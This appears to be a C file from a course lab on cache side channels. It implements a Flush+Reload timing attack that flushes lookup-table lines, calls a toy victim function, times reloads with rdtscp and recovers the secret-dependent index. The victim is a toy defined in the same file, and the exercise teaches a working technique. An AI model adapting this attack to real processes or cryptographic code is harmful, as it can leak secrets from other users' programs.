#include <emmintrin.h>
#include <stdint.h>
#include <stdio.h>
#include <x86intrin.h>

#include <stdlib.h>

#include "shuffle_map.h"

uint8_t LUT[256 * 512];

int victim(int input) {
  int index = (input * 163) & 0xFF;
  volatile int internal_value = LUT[index * 512];
  return (internal_value * 233) & 0xFFFF;
}

void attack(int input) {
  // TODO: Specify the threshold
  uint64_t threshold = 100;

  // TODO: Build a table to store the hit time of each block
  int hits[256] = {0};

  // TODO: Perform repeated attack to improve precision
  for (int n = 0; n < 3e3; n++) {
    // 1. Flush cache
    for (int i = 0; i < 256; i++){
      _mm_clflush(&LUT[i*512]);
      // wait several cycles for clflush to commit
      for (volatile int j = 0; j < 100; j++);
      // memory fence
      _mm_mfence();
    }
    // this will trigger a cache miss

    // 2. Call victim
      victim(input);

    // 3. Check each block to see if it's hit

      for (int i = 0; i < 256; i++){
        unsigned int next_idx = forward[i] * 512;
        volatile unsigned int junk = 0; // A junk number as parameter
        uint64_t t0 = __rdtscp((unsigned int*)&junk); // get current time stamp
        LUT[next_idx]++;
        uint64_t delta = __rdtscp((unsigned int*)&junk) - t0;
        if (delta < threshold) {
          hits[forward[i]]++;
        }
      }
  }


  // TODO: Find the index with maximum probability
  int guessed_index = 0;

  for (int i = 1; i < 256; i++) {
    if(hits[i] > hits[guessed_index]) {
      guessed_index = i;
    }
  }

  // compute the expected index
  int oracle_index = (input * 163) & 0xFF;

  // print the attack result
  printf("Attack index: %d, Correct index: %d \n", guessed_index, oracle_index);
}

int main() {
  // initialize LUT
  for (int i = 0; i < 256; i++) {
    LUT[i * 512] = rand();
  }

  // perform attacks
  attack(10);
  attack(35);
  attack(100);

  // you may add more testing cases here

  return 0;
}
